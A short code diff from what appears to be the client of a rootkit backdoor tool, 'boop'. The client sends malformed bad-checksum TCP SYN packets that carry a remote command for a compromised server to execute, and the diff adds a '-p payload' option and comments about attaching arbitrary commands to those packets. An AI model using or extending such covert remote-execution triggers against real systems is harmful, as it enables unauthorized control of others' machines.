@@ -51,6 +51,7 @@ void usage() {
   boopprintf("-rport             Remote (dst) port      : 22\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-x, execute        Remote command to exec : ls -la\n");
+  boopprintf("-p, payload        Boop with a TCP payload. No reverse connection.\n");
   boopprintf("-h, help           Print help and usage.\n");
   boopprintf("\n");
   exit(0);
@@ -203,8 +204,6 @@ int main(int argc, char **argv) {
   inet_ntop(AF_INET, &daddr.sin_addr, daddrstr, sizeof daddrstr);
   inet_ntop(AF_INET, &saddr.sin_addr, saddrstr, sizeof saddrstr);
 
-  //
-
   // ===========================================================================
   // 1. Bad checksum SYN SOCK_RAW (Connectionless)
   //
@@ -230,8 +229,7 @@ int main(int argc, char **argv) {
   // [SYN] Send a packet with a 0 checksum!
   char *packet;
   int packet_len;
-  // TODO: @kris-nova We should spam a few bad checksum ports! We know we can
-  // send to any TCP port on the server!
+  // Create a malformed TCP packet with an arbitrary command payload attached to the packet.
   create_bad_syn_packet_payload(&saddr, &daddr, &packet, &packet_len, cfg.rce);
   int sent;
   if ((sent = sendto(sock1, packet, packet_len, 0, (struct sockaddr *)&daddr,
